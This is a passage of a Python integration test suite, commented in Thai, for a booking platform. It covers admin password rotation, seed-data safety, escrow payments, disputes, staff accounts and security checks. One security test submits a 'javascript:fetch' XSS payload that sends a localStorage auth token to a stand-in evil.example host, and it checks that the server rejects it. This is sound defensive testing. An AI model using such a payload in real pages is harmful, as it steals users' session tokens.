    for item in nr.json():
        check(f"รอบถัดไปของ {item['service_name']} ต้องเป็นวันในอนาคต",
              item["suggested_date"] > str(date.today()), True)
        check(f"ระยะห่างของ {item['service_name']} ต้องเป็นบวก",
              item["interval_days"] > 0, True)

    # ==================================================================
    # ADMIN_PASSWORD ต้องมีผลจริง แม้ฐานข้อมูลจะถูก seed ไปแล้ว
    # ==================================================================
    #
    # บั๊กที่เจอบนเว็บจริง 24 ส.ค.: ตั้ง ADMIN_PASSWORD ใน Render แล้ว
    # แต่ล็อกอิน admin ยังได้ 401 ตลอด
    #
    # สาเหตุ: _admin_password() ถูกอ่านตอน "สร้างบัญชีครั้งแรก" เท่านั้น
    # พอฐานข้อมูลมีข้อมูลแล้ว seed_database() จะ return ตั้งแต่บรรทัดแรก
    # ค่าที่ตั้งทีหลังจึงไม่มีผลอะไรเลย และรหัสสุ่มที่พิมพ์ลง log ครั้งเดียว
    # ก็หายไปพร้อม log — เข้าบัญชี admin บนเว็บจริงไม่ได้อีกเลย
    #
    # เทสต์นี้จำลองสถานการณ์เดียวกัน: ฐานข้อมูลมีข้อมูลแล้ว → ตั้งค่าใหม่ →
    # ต้องเข้าได้ด้วยรหัสใหม่ และเข้าไม่ได้ด้วยรหัสเก่า
    print("\n--- ADMIN_PASSWORD หลังฐานข้อมูลถูก seed แล้ว ---")
    from app.database import SessionLocal          # noqa: E402
    from app.seed import DEMO_PASSWORD, sync_admin_password  # noqa: E402

    check("รหัสเดิมของ admin ใช้ได้ก่อนเปลี่ยน", c.post("/api/auth/login", json={
        "username": "admin", "password": DEMO_PASSWORD,
    }).status_code, 200)

    NEW_ADMIN_PW = "Rotated-Admin-9f3k"
    os.environ["ADMIN_PASSWORD"] = NEW_ADMIN_PW
    db = SessionLocal()
    try:
        # seed_database() จะข้ามทันทีเพราะมีข้อมูลแล้ว — นี่คือจุดที่เคยพลาด
        from app.seed import seed_database
        seed_database(db)
    finally:
        db.close()

    check("เข้าด้วยรหัสใหม่ได้", c.post("/api/auth/login", json={
        "username": "admin", "password": NEW_ADMIN_PW,
    }).status_code, 200)
    check("รหัสเก่าใช้ไม่ได้แล้ว", c.post("/api/auth/login", json={
        "username": "admin", "password": DEMO_PASSWORD,
    }).status_code, 401)

    # เรียกซ้ำต้องไม่พัง และต้องไม่เปลี่ยนอะไร (ระบบรีสตาร์ตบ่อยบน Render)
    db = SessionLocal()
    try:
        sync_admin_password(db)
        sync_admin_password(db)
    finally:
        db.close()
    check("เรียกซ้ำแล้วยังเข้าได้เหมือนเดิม", c.post("/api/auth/login", json={
        "username": "admin", "password": NEW_ADMIN_PW,
    }).status_code, 200)

    # ไม่ได้ตั้ง ADMIN_PASSWORD ต้องไม่ไปแตะรหัสเดิมของใคร
    os.environ.pop("ADMIN_PASSWORD", None)
    db = SessionLocal()
    try:
        sync_admin_password(db)
    finally:
        db.close()
    check("ไม่ได้ตั้งค่าไว้ ต้องไม่รีเซ็ตรหัสเดิม", c.post("/api/auth/login", json={
        "username": "admin", "password": NEW_ADMIN_PW,
    }).status_code, 200)

    # บัญชีอื่นต้องไม่ถูกกระทบ
    check("บัญชีลูกค้าไม่ถูกแตะต้อง", c.post("/api/auth/login", json={
        "username": "mind", "password": DEMO_PASSWORD,
    }).status_code, 200)

    # ------------------------------------------------------------------
    # ข้อมูลตัวอย่างต้องไม่แตะร้านของผู้ใช้จริง
    # ------------------------------------------------------------------
    # บั๊กจริงที่เกิดบนเว็บจริง: seed_closed_weekdays() ใส่วันหยุดประจำสัปดาห์
    # ให้ "ทุกร้านที่ยังไม่ได้ตั้งค่า" ซึ่งกินร้านที่ผู้ใช้เปิดเองไปด้วย
    # ร้านของผู้ใช้จริงร้านหนึ่งจึงถูกสั่งปิดวันจันทร์โดยที่เจ้าของไม่เคยสั่ง
    #
    # เทสต์นี้สร้างร้านใหม่ในนามผู้ใช้จริง แล้วเรียกฟังก์ชัน seed ซ้ำ
    # ร้านนั้นต้องไม่ถูกแตะเลย
    print("\n--- ข้อมูลตัวอย่างต้องไม่แตะร้านของผู้ใช้จริง ---")
    from app.seed_extra import seed_closed_weekdays  # noqa: E402

    real = c.post("/api/auth/register", json={
        "username": "realowner_t", "email": "realowner_t@example.com",
        "password": DEMO_PASSWORD, "full_name": "เจ้าของร้านจริง",
        "role": "owner",
    })
    check("สมัครบัญชีเจ้าของร้านจริงได้", real.status_code in (200, 201), True)
    real_hdr = login("realowner_t")

    cats = c.get("/api/categories").json()
    spa = next((x for x in cats if x["slug"] == "spa-massage"), cats[0])
    made = c.post("/api/shops", headers=real_hdr, json={
        "name": "ร้านของผู้ใช้จริง ทดสอบ", "category_id": spa["id"],
        "province": "ชลบุรี", "district": "บ้านบึง",
        "open_time": "10:00:00", "close_time": "20:00:00",
    })
    check("เปิดร้านในนามผู้ใช้จริงได้", made.status_code in (200, 201), True)
    real_shop_id = made.json()["id"]

    check("ร้านที่เพิ่งเปิด ต้องยังไม่มีวันหยุดประจำ",
          c.get(f"/api/shops/{real_shop_id}").json()["closed_weekdays"], None)

    db = SessionLocal()
    try:
        seed_closed_weekdays(db)
    finally:
        db.close()

    check("เรียก seed ซ้ำแล้ว ร้านของผู้ใช้จริงต้องไม่ถูกตั้งวันหยุดให้",
          c.get(f"/api/shops/{real_shop_id}").json()["closed_weekdays"], None)

    # ต้องยังทำงานกับร้านตัวอย่างอยู่ ไม่ใช่ปิดตายทั้งฟังก์ชัน
    demo_spa = c.get("/api/shops/1").json()
    check("ร้านตัวอย่างต้องยังได้วันหยุดประจำตามปกติ",
          bool(demo_spa["closed_weekdays"]), True)

    # ------------------------------------------------------------------
    # โปรไฟล์ช่าง — สถิติจากงานจริง และรูปโปรไฟล์
    # ------------------------------------------------------------------
    # เทสต์นี้เกิดจากการตรวจรอบหลัง: endpoint นี้ไม่เคยถูกเรียกในชุดทดสอบเลย
    # และมีจุดที่พังเฉพาะบน SQLite อยู่จริง (ลบเวลาที่มีกับไม่มี timezone)
    # ถ้าไม่มีเทสต์ บั๊กแบบนี้จะหลุดไปรู้ตอนผู้ใช้กดดูโปรไฟล์บนเว็บจริง
    print("\n--- โปรไฟล์ช่าง ---")
    from io import BytesIO  # noqa: E402

    from PIL import Image  # noqa: E402

    shop1 = c.get("/api/shops/1").json()
    member = shop1["staff"][0]
    r = c.get(f"/api/staff/{member['id']}")
    check("เปิดโปรไฟล์ช่างได้ (ไม่พังเรื่อง timezone บน SQLite)", r.status_code, 200)
    prof = r.json()
    check("มีรายการบริการที่ทำบ่อย (เป็นลิสต์เสมอ แม้ว่าง)", isinstance(prof.get("top_services"), list), True)
    check("มีคะแนนย่อยรายด้าน", isinstance(prof.get("aspects"), dict), True)
    check("อัตรากลับมาซ้ำต้องเป็น null เมื่อลูกค้ายังไม่ถึง 5 คน",
          prof["repeat_rate"] is None or prof["total_customers"] >= 5, True)
    check("ยังไม่มีรูป photo_url ต้องเป็น null", prof.get("photo_url"), None)
    check("ไม่ส่งชื่อไฟล์ดิบออกไป (ซ่อน photo_name)", "photo_name" in prof, False)

    # อัปรูปในนามเจ้าของร้าน 1 (spaowner)
    owner_hdr = login("spaowner")
    buf = BytesIO()
    Image.new("RGB", (320, 320), (200, 120, 90)).save(buf, format="PNG")
    up = c.post(
        f"/api/staff/{member['id']}/photo",
        headers=owner_hdr,
        files={"file": ("face.png", buf.getvalue(), "image/png")},
    )
    check("เจ้าของร้านอัปรูปช่างได้", up.status_code, 200)
    url = up.json().get("photo_url") or ""
    check("ได้ที่อยู่รูปกลับมา", url.startswith(f"/uploads/staff/{member['id']}/"), True)

    got = c.get(url)
    check("เปิดรูปจากที่อยู่นั้นได้", got.status_code, 200)
    check("รูปถูกแปลงเป็น WebP", got.headers.get("content-type"), "image/webp")

    # ลูกค้าทั่วไปต้องอัปรูปช่างของร้านคนอื่นไม่ได้
    bad = c.post(
        f"/api/staff/{member['id']}/photo",
        headers=cust,
        files={"file": ("x.png", buf.getvalue(), "image/png")},
    )
    check("ลูกค้าอัปรูปช่างไม่ได้", bad.status_code, 403)

    # อัปรูปใหม่แล้ว URL เก่าต้องใช้ไม่ได้ ไม่งั้นแคชหนึ่งปีจะค้างรูปเดิม
    buf2 = BytesIO()
    Image.new("RGB", (320, 320), (40, 90, 200)).save(buf2, format="PNG")
    up2 = c.post(
        f"/api/staff/{member['id']}/photo",
        headers=owner_hdr,
        files={"file": ("face2.png", buf2.getvalue(), "image/png")},
    )
    check("อัปรูปใหม่ทับได้", up2.status_code, 200)
    check("URL เก่าต้องใช้ไม่ได้แล้ว", c.get(url).status_code, 404)

    # ==================================================================
    # ตัวช่วยสร้างคิวในอดีตตรง ๆ ผ่านฐานข้อมูล (API กันการจองย้อนหลังไว้แล้ว)
    # ==================================================================
    from decimal import Decimal as D  # noqa: E402

    from app.models import Booking as BK, Payment as PM, Staff as ST  # noqa: E402

    shop1 = c.get("/api/shops/1").json()
    svc1 = next(x for x in shop1["services"] if x["is_active"])
    mind_id = c.get("/api/users/me", headers=cust).json()["id"]
    seq = {"n": 0}

    def past_booking(user_id, days_ago=1, status="confirmed", staff_id=None, pay=()):
        """คิวของร้าน 1 เมื่อ days_ago วันก่อน พร้อมรายการเงินที่ "พักไว้" ตาม pay

        pay เป็นลิสต์ของ (kind, method) เช่น [("deposit", "promptpay")]
        """
        seq["n"] += 1
        price = D(str(svc1["price"]))
        db = SessionLocal()
        try:
            b = BK(
                user_id=user_id, shop_id=1, service_id=svc1["id"], staff_id=staff_id,
                booking_code=f"BVESC{seq['n']:04d}",
                booking_date=date.today() - timedelta(days=days_ago),
                booking_time=__import__("datetime").time(10, 0),
                end_time=__import__("datetime").time(11, 0),
                status=status, holds_slot=True,
                total_price=price, deposit_amount=(price * D("0.2")).quantize(D("0.01")),
            )
            db.add(b)
            db.flush()
            for kind, method in pay:
                amount = b.deposit_amount if kind == "deposit" else price - b.deposit_amount
                db.add(PM(booking_id=b.id, kind=kind, amount=amount, method=method,
                          status="paid", reference="TEST"))
            db.commit()
            return b.id
        finally:
            db.close()

    owner = login("spaowner")
    get_b = lambda bid, who=None: c.get(f"/api/bookings/{bid}", headers=who or cust).json()  # noqa: E731

    # ==================================================================
    # ระบบพักเงิน — เงินอยู่ที่ระบบจนกว่างานจะจบจริง
    # ==================================================================
    print("\n--- ระบบพักเงิน: ลูกค้ายืนยันแล้วเงินเข้าร้าน ---")
    b1 = past_booking(mind_id)
    pay1 = c.post(f"/api/bookings/{b1}/payment", headers=cust,
                  json={"kind": "balance", "method": "promptpay"})
    check("จ่ายออนไลน์ได้", pay1.status_code, 201)
    info = get_b(b1)
    check("เงินที่จ่ายออนไลน์ต้องพักไว้ที่ระบบก่อน", info["escrow_state"], "held")
    check("ยอดพัก = ยอดที่จ่าย", float(info["held_amount"]), float(info["paid_amount"]))
    check("ร้านยังไม่ปิดงาน ลูกค้ายืนยันไม่ได้",
          c.post(f"/api/bookings/{b1}/confirm-service", headers=cust).status_code, 409)

    done = c.patch(f"/api/bookings/{b1}/status", headers=owner, json={"status": "completed"})
    check("ร้านกดให้บริการเสร็จได้หลังเวลานัด", done.status_code, 200)
    info = done.json()
    check("ปิดงานแล้วบันทึกเวลาไว้", info["service_done_at"] is not None, True)
    check("ปิดงานแล้วเงินยังพักอยู่ รอลูกค้า", info["escrow_state"], "held")
    check("บอกเวลาที่ระบบจะปล่อยเงินเอง", info["auto_release_at"] is not None, True)

    nong_hdr = login("nong")
    check("คนอื่นกดยืนยันแทนเจ้าของคิวไม่ได้",
          c.post(f"/api/bookings/{b1}/confirm-service", headers=nong_hdr).status_code, 403)
    ok1 = c.post(f"/api/bookings/{b1}/confirm-service", headers=cust)
    check("ลูกค้ายืนยันว่าได้รับบริการแล้ว", ok1.status_code, 200)
    check("ยืนยันแล้วเงินเข้าร้านทันที", ok1.json()["escrow_state"], "released")

    print("\n--- ระบบพักเงิน: กระเป๋าเงินและการโอนให้ร้าน ---")
    wallet = c.get("/api/shops/1/wallet", headers=owner)
    check("เจ้าของร้านเปิดกระเป๋าเงินได้", wallet.status_code, 200)
    check("ลูกค้าเปิดกระเป๋าเงินร้านไม่ได้",
          c.get("/api/shops/1/wallet", headers=cust).status_code, 403)
    w = wallet.json()
    check("มียอดพร้อมโอนจากงานที่เพิ่งยืนยัน", float(w["available_gross"]) >= float(info["paid_amount"]), True)
    check("ยังไม่ตั้งบัญชี โอนไม่ได้",
          c.post("/api/shops/1/payouts", headers=owner).status_code, 409)
    check("เลขบัญชีต้องเป็นตัวเลขล้วน",
          c.put("/api/shops/1/bank", headers=owner, json={
              "bank_name": "กสิกรไทย", "bank_account_no": "12ab", "bank_account_name": "ร้านทดสอบ",
          }).status_code, 422)
    check("ตั้งบัญชีรับเงินได้",
          c.put("/api/shops/1/bank", headers=owner, json={
              "bank_name": "กสิกรไทย", "bank_account_no": "1234567890", "bank_account_name": "ร้านทดสอบ",
          }).status_code, 200)
    w = c.get("/api/shops/1/wallet", headers=owner).json()
    check("เลขบัญชีถูกปิดไว้ เห็นแค่ 4 ตัวท้าย", w["bank_account_no_masked"].endswith("7890")
          and "1234" not in w["bank_account_no_masked"], True)
    check("ข้อมูลบัญชีไม่หลุดไปกับข้อมูลร้านสาธารณะ",
          "bank_account_no" in c.get("/api/shops/1").json(), False)

    po = c.post("/api/shops/1/payouts", headers=owner)
    check("โอนเงินเข้าบัญชีร้านได้", po.status_code, 201)
    if po.status_code == 201:
        pj = po.json()
        # เทียบแบบยอมคลาด 1 สตางค์ — เซิร์ฟเวอร์ปัดครึ่งขึ้น (ROUND_HALF_UP) แต่ round()
        # ของ Python ปัดเข้าหาเลขคู่ ยอดที่ลงท้าย .xx5 จะต่างกัน 0.01 ทั้งที่ถูกทั้งคู่
        check("หักค่าธรรมเนียม 5%",
              abs(float(pj["fee"]) - float(pj["gross"]) * 0.05) <= 0.01, True)
        check("ยอดที่ได้ = ก่อนหัก - ค่าธรรมเนียม",
              round(float(pj["net"]), 2), round(float(pj["gross"]) - float(pj["fee"]), 2))
    check("โอนซ้ำทันทีไม่ได้ เพราะไม่มียอดเหลือ",
          c.post("/api/shops/1/payouts", headers=owner).status_code, 409)
    pid1 = c.get(f"/api/bookings/{b1}/payment", headers=cust).json()["payments"][0]["id"]
    check("เงินที่โอนให้ร้านไปแล้ว ระบบคืนแทนไม่ได้",
          c.post(f"/api/payments/{pid1}/refund", headers=owner).status_code, 409)

    print("\n--- ระบบพักเงิน: ไม่มีใครกดอะไร ระบบปล่อยเงินเองเมื่อครบเวลา ---")
    b2 = past_booking(mind_id, pay=[("deposit", "promptpay")])
    c.patch(f"/api/bookings/{b2}/status", headers=owner, json={"status": "completed"})
    check("เพิ่งปิดงาน เงินยังไม่ถูกปล่อย", get_b(b2)["escrow_state"], "held")
    db = SessionLocal()
    try:
        row = db.get(BK, b2)
        from datetime import datetime as _dt, timezone as _tz  # noqa: E402
        row.service_done_at = _dt.now(_tz.utc) - timedelta(hours=25)
        db.commit()
    finally:
        db.close()
    check("ครบ 24 ชั่วโมงแล้ว ระบบปล่อยเงินให้ร้านเอง", get_b(b2)["escrow_state"], "released")

    print("\n--- ระบบพักเงิน: ลูกค้าแจ้งปัญหา ผู้ดูแลตัดสิน ---")
    b3 = past_booking(mind_id, pay=[("deposit", "promptpay"), ("balance", "promptpay")])
    check("ยังไม่ปิดงาน แจ้งปัญหาไม่ได้ (ให้ยกเลิกแทน)",
          c.post(f"/api/bookings/{b3}/dispute", headers=cust, json={"note": "ร้านไม่เปิด"}).status_code, 409)
    c.patch(f"/api/bookings/{b3}/status", headers=owner, json={"status": "completed"})
    dp = c.post(f"/api/bookings/{b3}/dispute", headers=cust,
                json={"note": "ไม่ได้รับบริการตามที่จอง"})
    check("ลูกค้าแจ้งปัญหาได้", dp.status_code, 200)
    check("แจ้งแล้วเงินถูกพักรอตัดสิน", dp.json()["escrow_state"], "disputed")
    check("แจ้งซ้ำไม่ได้",
          c.post(f"/api/bookings/{b3}/dispute", headers=cust, json={"note": "แจ้งอีกรอบนะ"}).status_code, 409)
    check("ระหว่างรอตัดสิน กดยืนยันปล่อยเงินไม่ได้",
          c.post(f"/api/bookings/{b3}/confirm-service", headers=cust).status_code, 409)

    admin_hdr = login("admin", NEW_ADMIN_PW)
    check("ร้านดูรายการแจ้งปัญหาของผู้ดูแลไม่ได้",
          c.get("/api/admin/disputes", headers=owner).status_code, 403)
    disputes = c.get("/api/admin/disputes", headers=admin_hdr).json()
    check("เรื่องที่แจ้งขึ้นในรายการของผู้ดูแล", any(d["booking_id"] == b3 for d in disputes), True)
    rs = c.post(f"/api/bookings/{b3}/resolve-dispute", headers=admin_hdr,
                json={"decision": "refund", "reason": "ร้านยอมรับว่าไม่ได้ให้บริการ"})
    check("ผู้ดูแลตัดสินคืนเงินได้", rs.status_code, 200)
    check("คืนแล้วสถานะเงินเป็นคืนลูกค้า", rs.json()["escrow_state"], "refunded")
    check("คืนแล้วยอดที่จ่ายเหลือศูนย์", float(rs.json()["paid_amount"]), 0.0)
    check("ตัดสินซ้ำไม่ได้",
          c.post(f"/api/bookings/{b3}/resolve-dispute", headers=admin_hdr,
                 json={"decision": "release"}).status_code, 409)

    print("\n--- ระบบพักเงิน: ยกเลิกแล้วคืนเงินอัตโนมัติ ---")
    sid = None
    for d in range(1, 15):
        rr = c.post("/api/bookings", headers=cust, json={
            "service_id": svc1["id"],
            "booking_date": (date.today() + timedelta(days=d)).isoformat(),
            "booking_time": "16:00:00",
        })
        if rr.status_code == 201:
            sid = rr.json()["id"]
            break
    check("จองคิวสำหรับทดสอบการยกเลิกได้", sid is not None, True)
    if sid:
        c.post(f"/api/bookings/{sid}/payment", headers=cust,
               json={"kind": "deposit", "method": "promptpay"})
        c.post(f"/api/bookings/{sid}/payment", headers=cust,
               json={"kind": "balance", "method": "promptpay"})
        by_shop = c.delete(f"/api/bookings/{sid}", headers=owner)
        check("ร้านยกเลิกได้", by_shop.status_code, 200)
        after = get_b(sid)
        check("ร้านยกเลิก ระบบคืนเงินลูกค้าครบอัตโนมัติ", float(after["paid_amount"]), 0.0)
        check("สถานะเงินเป็นคืนลูกค้าแล้ว", after["escrow_state"], "refunded")

    print("\n--- กฎสถานะการจอง ---")
    b4 = past_booking(mind_id, pay=[("deposit", "promptpay"), ("balance", "promptpay")])
    check("ลูกค้ายกเลิกเองหลังเลยเวลานัดไม่ได้",
          c.delete(f"/api/bookings/{b4}", headers=cust).status_code, 409)
    check("ลูกค้าเลื่อนนัดเองหลังเลยเวลานัดไม่ได้",
          c.patch(f"/api/bookings/{b4}/reschedule", headers=cust, json={
              "booking_date": (date.today() + timedelta(days=3)).isoformat(),
              "booking_time": "10:00:00",
          }).status_code, 409)
    ns = c.post(f"/api/bookings/{b4}/no-show", headers=owner)
    check("ร้านบันทึกว่าลูกค้าไม่มาได้หลังเวลานัด", ns.status_code, 200)
    nsj = ns.json()
    check("บันทึกว่าเป็นกรณีลูกค้าไม่มา", nsj["cancelled_by"], "no_show")
    check("ร้านได้ค่ามัดจำ", float(nsj["cancellation_fee"]), float(nsj["deposit_amount"]))
    check("ส่วนที่จ่ายเกินมัดจำคืนลูกค้าอัตโนมัติ",
          float(nsj["paid_amount"]), float(nsj["deposit_amount"]))
    check("คิวที่ยกเลิกแล้ว เปลี่ยนเป็นเสร็จสิ้นไม่ได้",
          c.patch(f"/api/bookings/{b4}/status", headers=owner,
                  json={"status": "completed"}).status_code, 409)

    if sid:
        check("คิวในอนาคตบันทึกว่าลูกค้าไม่มาไม่ได้",
              c.post(f"/api/bookings/{sid}/no-show", headers=owner).status_code, 409)
    fut = None
    for d in range(2, 16):
        rr = c.post("/api/bookings", headers=cust, json={
            "service_id": svc1["id"],
            "booking_date": (date.today() + timedelta(days=d)).isoformat(),
            "booking_time": "17:00:00",
        })
        if rr.status_code == 201:
            fut = rr.json()["id"]
            break
    if fut:
        c.patch(f"/api/bookings/{fut}/status", headers=owner, json={"status": "confirmed"})
        check("ยังไม่ถึงเวลานัด ปิดงานไม่ได้",
              c.patch(f"/api/bookings/{fut}/status", headers=owner,
                      json={"status": "completed"}).status_code, 409)
    else:
        skip("ปิดงานก่อนเวลา", "จองคิวในอนาคตไม่ได้")

    # ==================================================================
    # ความปลอดภัย
    # ==================================================================
    print("\n--- ความปลอดภัย ---")
    xss = None
    for d in range(1, 15):
        xss = c.post("/api/bookings", headers=cust, json={
            "service_id": svc1["id"],
            "booking_date": (date.today() + timedelta(days=d)).isoformat(),
            "booking_time": "11:00:00",
            "reference_url": "javascript:fetch('https://evil.example/'+localStorage.bookvice_token)",
        })
        if xss.status_code != 409:
            break
    check("ลิงก์รูปตัวอย่างแบบ javascript: ต้องถูกปฏิเสธ (กัน XSS)", xss.status_code, 422)

    real_cust = c.post("/api/auth/register", json={
        "username": "realcust_t", "email": "realcust_t@gmail.com",
        "password": DEMO_PASSWORD, "full_name": "ลูกค้าจริง ทดสอบ",
    })
    check("สมัครลูกค้าจริงได้", real_cust.status_code in (200, 201), True)
    rc_hdr = login("realcust_t")
    real_bk = None
    for d in range(1, 15):
        rr = c.post("/api/bookings", headers=rc_hdr, json={
            "service_id": svc1["id"],
            "booking_date": (date.today() + timedelta(days=d)).isoformat(),
            "booking_time": "13:00:00",
            "health_note": "แพ้ยาแก้ปวดกลุ่ม NSAIDs",
            "reference_url": "https://example.com/hair.jpg",
        })
        if rr.status_code == 201:
            real_bk = rr.json()["id"]
            break
    check("ลิงก์ https ปกติยังใช้ได้", real_bk is not None, True)
    if real_bk:
        seen = get_b(real_bk, owner)
        check("บัญชีร้านทดลองต้องไม่เห็นข้อมูลสุขภาพของลูกค้าจริง", seen["health_note"], None)
        check("บัญชีร้านทดลองต้องไม่เห็นลิงก์ของลูกค้าจริง", seen["reference_url"], None)
        mine = get_b(real_bk, rc_hdr)
        check("ลูกค้าเจ้าของคิวยังเห็นข้อมูลของตัวเองครบ", mine["health_note"], "แพ้ยาแก้ปวดกลุ่ม NSAIDs")

    check("เปลี่ยนอีเมลโดยไม่ใส่รหัสผ่านไม่ได้",
          c.put(f"/api/users/{c.get('/api/users/me', headers=rc_hdr).json()['id']}",
                headers=rc_hdr, json={"email": "stolen@gmail.com"}).status_code, 422)
    me_id = c.get("/api/users/me", headers=rc_hdr).json()["id"]
    check("ใส่รหัสผ่านถูกแล้วเปลี่ยนอีเมลได้",
          c.put(f"/api/users/{me_id}", headers=rc_hdr, json={
              "email": "realcust_new@gmail.com", "current_password": DEMO_PASSWORD,
          }).status_code, 200)

    other_device = login("realcust_t")
    chg = c.post("/api/auth/change-password", headers=rc_hdr, json={
        "old_password": DEMO_PASSWORD, "new_password": "NewPass-5678",
    })
    check("เปลี่ยนรหัสผ่านได้", chg.status_code, 200)
    check("เปลี่ยนรหัสแล้ว เครื่องอื่นที่ล็อกอินค้างไว้ต้องหลุด",
          c.get("/api/users/me", headers=other_device).status_code, 401)
    check("ล็อกอินด้วยรหัสใหม่ได้",
          c.post("/api/auth/login", json={"username": "realcust_t", "password": "NewPass-5678"}).status_code, 200)
    check("รหัสเดิมผิดตอนเปลี่ยนรหัส ต้องไม่ได้ 401 (หน้าเว็บจะเตะออกจากระบบ)",
          c.post("/api/auth/change-password", headers=login("realcust_t", "NewPass-5678"), json={
              "old_password": "wrong-password", "new_password": "Another-999",
          }).status_code, 422)

    csp = c.get("/health").headers.get("content-security-policy", "")
    check("มีส่วนหัว Content-Security-Policy", "default-src 'self'" in csp, True)
    check("ห้ามเว็บอื่นเอาหน้าเราไปใส่ iframe", "frame-ancestors 'none'" in csp, True)
    check("หน้าเอกสาร API ไม่ใส่ CSP (ไม่งั้นขาวทั้งหน้า)",
          "content-security-policy" in c.get("/docs").headers, False)

    # ==================================================================
    # บัญชีพนักงาน — ช่างล็อกอินมาดูแลโปรไฟล์และดูคิวของตัวเอง
    # ==================================================================
    print("\n--- บัญชีพนักงาน ---")
    member = shop1["staff"][0]
    other_member = next((x for x in shop1["staff"] if x["id"] != member["id"]), None)
    c.post("/api/auth/register", json={
        "username": "stafftest", "email": "stafftest@example.com",
        "password": DEMO_PASSWORD, "full_name": "ช่างทดสอบ ใจดี",
    })
    stf_hdr = login("stafftest")

    check("ลูกค้าผูกบัญชีช่างของร้านอื่นไม่ได้",
          c.put(f"/api/staff/{member['id']}/account", headers=cust,
                json={"login": "stafftest"}).status_code, 403)
    check("ผูกกับบัญชีที่ไม่มีอยู่จริงไม่ได้",
          c.put(f"/api/staff/{member['id']}/account", headers=owner,
                json={"login": "no_such_user_x"}).status_code, 404)
    check("ผูกกับบัญชีผู้ดูแลระบบไม่ได้",
          c.put(f"/api/staff/{member['id']}/account", headers=owner,
                json={"login": "admin"}).status_code, 400)
    lk = c.put(f"/api/staff/{member['id']}/account", headers=owner, json={"login": "stafftest"})
    check("เจ้าของร้านผูกบัญชีช่างได้", lk.status_code, 200)
    check("หน้าร้านบอกว่าช่างคนนี้มีบัญชีแล้ว",
          next(x for x in c.get("/api/shops/1").json()["staff"] if x["id"] == member["id"])["has_account"], True)
    check("หน้าร้านไม่เปิดเผยว่าผูกกับบัญชีไหน",
          "user_id" in c.get("/api/shops/1").json()["staff"][0], False)

    mine = c.get("/api/me/staff", headers=stf_hdr).json()
    check("ช่างเห็นโปรไฟล์ของตัวเอง", [m["id"] for m in mine], [member["id"]])
    ed = c.put(f"/api/me/staff/{member['id']}", headers=stf_hdr, json={
        "bio": "ทำผมมา 8 ปี ถนัดตัดสั้น", "specialties": "ตัดสั้น,ทำสี", "experience_years": 8,
    })
    check("ช่างแก้ประวัติของตัวเองได้", ed.status_code, 200)
    prof = c.get(f"/api/staff/{member['id']}").json()
    check("หน้าโปรไฟล์สาธารณะเห็นความถนัดที่ช่างกรอก", prof["specialties"], "ตัดสั้น,ทำสี")
    check("หน้าโปรไฟล์มีรายการบริการให้จองต่อได้", len(prof["services"]) > 0, True)
    check("หน้าโปรไฟล์แสดงรูปได้ (เคยเป็น null ตลอด)", (prof.get("photo_url") or "").startswith("/uploads/staff/"), True)
    if other_member:
        check("ช่างแก้โปรไฟล์ของคนอื่นไม่ได้",
              c.put(f"/api/me/staff/{other_member['id']}", headers=stf_hdr,
                    json={"bio": "แอบแก้"}).status_code, 403)
    check("ช่างแก้ชื่อ ตำแหน่ง หรือเวลาทำงานเองไม่ได้ (เป็นเรื่องของร้าน)",
          c.put(f"/api/staff/{member['id']}", headers=stf_hdr,
                json={"name": "ชื่อใหม่"}).status_code, 403)
    buf3 = BytesIO()
    Image.new("RGB", (300, 300), (10, 160, 90)).save(buf3, format="PNG")
    check("ช่างเปลี่ยนรูปโปรไฟล์ของตัวเองได้",
          c.post(f"/api/staff/{member['id']}/photo", headers=stf_hdr,
                 files={"file": ("me.png", buf3.getvalue(), "image/png")}).status_code, 200)

    q_bk = None
    q_day, q_slot, _ = find_free_slot(c, svc1["id"], member["id"], start=1)
    if q_slot:
        rr = c.post("/api/bookings", headers=cust, json={
            "service_id": svc1["id"], "staff_id": member["id"],
            "booking_date": q_day, "booking_time": q_slot["time"],
            "health_note": "ตั้งครรภ์ 4 เดือน",
        })
        q_bk = rr.json()["id"] if rr.status_code == 201 else None
    queue = c.get(f"/api/me/staff/{member['id']}/queue", headers=stf_hdr)
    check("ช่างดูคิวของตัวเองได้", queue.status_code, 200)
    if not q_bk:
        skip("คิวของช่าง", "หาช่องว่างของช่างคนนี้ไม่เจอ")
    else:
        item = next((x for x in queue.json() if x["booking_id"] == q_bk), None)
        check("คิวที่ลูกค้าเลือกช่างคนนี้ขึ้นในรายการ", item is not None, True)
        check("ช่างเห็นข้อควรระวังด้านสุขภาพเพื่อเตรียมงาน",
              item and item["health_note"], "ตั้งครรภ์ 4 เดือน")
        check("ช่างไม่เห็นนามสกุลเต็มของลูกค้า", item and "." in item["customer_name"], True)
    check("คนอื่นดูคิวของช่างคนนี้ไม่ได้",
          c.get(f"/api/me/staff/{member['id']}/queue", headers=cust).status_code, 403)

    check("ช่างออกจากร้านเองได้",
          c.delete(f"/api/staff/{member['id']}/account", headers=stf_hdr).status_code, 200)
    check("ออกแล้วไม่เห็นโปรไฟล์ของร้านนั้นอีก",
          c.get("/api/me/staff", headers=stf_hdr).json(), [])

    # ==================================================================
    # index ชุดใหม่จาก indexing-lab ต้องถูกสร้างจริง และชุดที่ถอดออกต้องไม่กลับมา
    # ==================================================================
    print("\n--- index ของฐานข้อมูล ---")
    from sqlalchemy import inspect as sa_inspect  # noqa: E402

    from app.database import engine  # noqa: E402

    insp = sa_inspect(engine)
    names = {t: {ix["name"] for ix in insp.get_indexes(t)}
             for t in ("bookings", "payments", "reviews", "notifications")}
    for table, ix in [
        ("bookings", "ix_bookings_shop_date"), ("bookings", "ix_bookings_user_id"),
        ("payments", "ix_payments_held"), ("reviews", "ix_reviews_shop_created"),
        ("notifications", "ix_notifications_user_id"), ("notifications", "ix_notif_unread"),
    ]:
        check(f"มี {ix}", ix in names[table], True)
    for table, ix in [
        ("bookings", "ix_bookings_status"), ("bookings", "ix_bookings_shop_id"),
        ("bookings", "ix_bookings_user_date"), ("payments", "ix_payments_status"),
        ("notifications", "ix_notifications_is_read"), ("notifications", "ix_notif_user_created"),
    ]:
        check(f"ไม่มี {ix} แล้ว (ซ้ำซ้อน ไม่มีใครใช้ หรือวัดแล้วไม่คุ้ม)", ix in names[table], False)

    print("\n" + "=" * 60)
    print(f"สรุป: ผ่าน {ok} · ไม่ผ่าน {fail} · ข้าม {skipped} บล็อก")
    if skipped:
        print("  ⚠️  มีบล็อกที่ถูกข้าม แปลว่าฟีเจอร์นั้นยังไม่ถูกทดสอบจริง")
    print("=" * 60)


try:
    main()
finally:
    os.unlink(DB)
raise SystemExit(1 if fail else 0)
